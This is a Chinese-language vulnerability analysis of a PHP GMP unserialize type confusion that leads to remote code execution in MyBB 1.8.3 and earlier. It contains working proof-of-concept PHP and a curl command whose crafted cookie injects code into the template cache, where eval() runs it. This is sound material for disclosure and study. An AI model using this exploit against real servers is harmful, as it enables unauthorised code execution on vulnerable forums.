MyBB\<=1.8.3 RCE
================

一、漏洞简介
------------

在使用精心编制的对象的`__wakeup()`魔术方法进行GMP反序列化时发现了一个类型混淆漏洞，该漏洞可被滥用来更新分配给已创建对象的任何属性，进而触发严重的安全问题。

二、漏洞影响
------------

PHP 5.6 \< 5.6.30

MyBB\<=1.8.3

三、复现过程
------------

### 漏洞分析

gmp.c

    static int gmp_unserialize(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC) /* {{{ */
    {
        ...
        ALLOC_INIT_ZVAL(zv_ptr);
        if (!php_var_unserialize(&zv_ptr, &p, max, &unserialize_data TSRMLS_CC)
            || Z_TYPE_P(zv_ptr) != IS_ARRAY
        ) {
            zend_throw_exception(NULL, "Could not unserialize properties", 0 TSRMLS_CC);
            goto exit;
        }

        if (zend_hash_num_elements(Z_ARRVAL_P(zv_ptr)) != 0) {
            zend_hash_copy(
                zend_std_get_properties(*object TSRMLS_CC), Z_ARRVAL_P(zv_ptr),
                (copy_ctor_func_t) zval_add_ref, NULL, sizeof(zval *)
            );
        }

zend\_object\_handlers.c

    ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */
    {
        zend_object *zobj;
        zobj = Z_OBJ_P(object);
        if (!zobj->properties) {
            rebuild_object_properties(zobj);
        }
        return zobj->properties;
    }

攻击者可以将`**object`更改为整数类型或bool类型的ZVAL，然后攻击者将能够通过`Z_OBJ_P`访问存储在对象库中的任何对象。这意味着攻击者将能够通过`zend_hash_copy()`更新对象中的任何属性。从而引发了一系列安全问题。

下面这段代码可以验证这个漏洞

    <?php

    class obj
    {
        var $ryat;

        function __wakeup()
        {
            $this->ryat = 1;
        }
    }

    $obj = new stdClass;
    $obj->aa = 1;
    $obj->bb = 2;

    $inner = 's:1:"1";a:3:{s:2:"aa";s:2:"hi";s:2:"bb";s:2:"hi";i:0;O:3:"obj":1:{s:4:"ryat";R:2;}}';
    $exploit = 'a:1:{i:0;C:3:"GMP":'.strlen($inner).':{'.$inner.'}}';
    $x = unserialize($exploit);
    var_dump($obj);

    ?>

预期结果:

    object(stdClass)#1 (2) {
      ["aa"]=>
      int(1)
      ["bb"]=>
      int(2)
    }

实际结果:

    object(stdClass)#1 (3) {
      ["aa"]=>
      string(2) "hi"
      ["bb"]=>
      string(2) "hi"
      [0]=>
      object(obj)#3 (1) {
        ["ryat"]=>
        &int(1)
      }
    }

### 漏洞利用

在`php 5.6<=5.6.11`中，DateInterval的`__wakeup()`使用`convert_to_long()`句柄并重新分配其属性，因此攻击者可以通过GMP的`gmp_cast_object()`将GMP对象转换成任何整数类型的ZVAL:

    static int gmp_cast_object(zval *readobj, zval *writeobj, int type TSRMLS_DC) /* {{{ */
    {
        mpz_ptr gmpnum;
        switch (type) {
        ...
        case IS_LONG:
            gmpnum = GET_GMP_FROM_ZVAL(readobj);
            INIT_PZVAL(writeobj);
            ZVAL_LONG(writeobj, mpz_get_si(gmpnum));
            return SUCCESS;

漏洞利用代码

    <?php

    var_dump(unserialize('a:2:{i:0;C:3:"GMP":17:{s:4:"1234";a:0:{}}i:1;O:12:"DateInterval":1:{s:1:"y";R:2;}}'));

    ?>

当然，也可以套用精心编制的`__wakeup()`

    <?php

    function __wakeup()
    {
        $this->ryat = (int) $this->ryat;
    }

    ?>

#### MyBB \<= 1.8.3

index.php

    if(isset($mybb->cookies['mybb']['forumread']))
        {
            $forumsread = my_unserialize($mybb->cookies['mybb']['forumread']);
        }

MyBB\<=1.8.3允许通过`unserialize()`反序列化cookie，因此攻击者能够更新`$mybb`或其他对象的属性，从而很容易导致安全问题，例如：XSS、SQL注入、RCE等
好消息是该漏洞已经在新版本得到了修复

### PoC

MyBB \<= 1.8.3 RCE漏洞

index.php

    eval('$index = "'.$templates->get('index').'";');

MyBB在模板解析过程中始终使用eval()函数。 inc/class\_templates.php

    class templates
    {
        ...
        public $cache = array();
        ...
        function get($title, $eslashes=1, $htmlcomments=1)
        {
            global $db, $theme, $mybb;
            ...
            $template = $this->cache[$title];
            ...
            return $template;
        }

如果我们可以控制`$cache`，我们就可以通过`eval()`函数注入php代码。
inc/init.php

    $error_handler = new errorHandler();
    ...
    $maintimer = new timer();
    ...
    $mybb = new MyBB;
    ...
    switch($config['database']['type'])
    {
        case "sqlite":
            $db = new DB_SQLite;
            break;
        case "pgsql":
            $db = new DB_PgSQL;
            break;
        case "mysqli":
            $db = new DB_MySQLi;
            break;
        default:
            $db = new DB_MySQL;
    }
    ...
    $templates = new templates;

`$templates`对象在`init.php`中实例化，并且在此之前实例化了四个对象。这意味着`$templates`对象的句柄被设置为5并存储到对象存储中，因此我们可以访问`$templates`对象并通过在GMP反序列化期间将GMP对象转换为整型ZVAL(其值为5)来更新`$cache`属性。这也表明我们可以通过eval()函数注入php代码。

当MyBB\<=1.8.3和PHP5.6\<=5.6.11时，只需在命令行上使用curl即可触发RCE：

    curl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:"GMP":106:{s:1:"5"%3ba:2:{s:5:"cache"%3ba:1:{s:5:"index"%3bs:14:"{${phpinfo()}}"%3b}i:0%3bO:12:"DateInterval":1:{s:1:"y"%3bR:2%3b}}}}' http://0-sec.org/mybb
